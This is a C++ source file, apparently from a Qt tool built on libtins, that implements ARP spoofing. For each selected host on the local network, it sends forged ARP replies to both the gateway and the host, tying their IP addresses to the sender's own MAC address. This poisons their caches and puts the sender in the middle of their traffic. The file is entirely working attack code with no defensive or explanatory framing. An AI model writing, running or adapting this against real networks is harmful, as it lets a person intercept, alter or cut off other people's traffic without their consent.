#include "ArpSpoofing.h"
#include <QDebug>
#include <QThread>
#include <QEventLoop>

using namespace Tins;

ArpSpoofing::ArpSpoofing(QObject *parent) : QObject(parent)
{
}

void ArpSpoofing::init(const NetworkInterface &interface)
{
    m_interface = interface;

    IPv4Address gateway;
    Tins::Utils::gateway_from_ip(m_interface.ipv4_address(), m_gatewayIp);

    m_gatewayHw = Utils::resolve_hwaddr(m_interface, m_gatewayIp, m_sender);
}

void ArpSpoofing::doSpoofing()
{
    if(!m_interface)
    {
        qCritical() << "ArpSpoofing has been not initialized !";
        return;
    }

    NetworkInterface::Info nifinfo = m_interface.info();

    // Foreach device on network
    foreach(IPv4Address target_ip, m_iplist.keys())
    {
        // Skip ourselves
        if(nifinfo.ip_addr == target_ip)
            continue;

        EthernetII::address_type target_hw = m_iphw[target_ip];

        // Gateway ---------------------------------------------------------

        EthernetII arp_reply_to_gw = ARP::make_arp_reply(m_gatewayIp, target_ip, m_gatewayHw, nifinfo.hw_addr);
        m_sender.send(arp_reply_to_gw, m_interface);

        // Target ---------------------------------------------------------

        EthernetII arp_reply_to_tr = ARP::make_arp_reply(target_ip, m_gatewayIp, target_hw, nifinfo.hw_addr);
        m_sender.send(arp_reply_to_tr, m_interface);

        qDebug() << "SPOOF"
                 << target_ip.to_string().data()
                 << m_gatewayIp.to_string().data()
                 << target_hw.to_string().data()
                 << nifinfo.hw_addr.to_string().data()
                    ;

//        qDebug() << "SPOOF" << arp_reply_to_tr.rfind_pdu<ARP>().sender_ip_addr().to_string().data();
    }
}

void ArpSpoofing::enableIp(Tins::IPv4Address ip, bool enabled)
{
  m_iplist[ip] = enabled;
  m_iphw[ip] = Utils::resolve_hwaddr(m_interface, ip, m_sender);
}

void ArpSpoofing::enableIp(QString ip, bool enabled)
{
  enableIp(Tins::IPv4Address(ip.toLocal8Bit().data()), enabled);
}
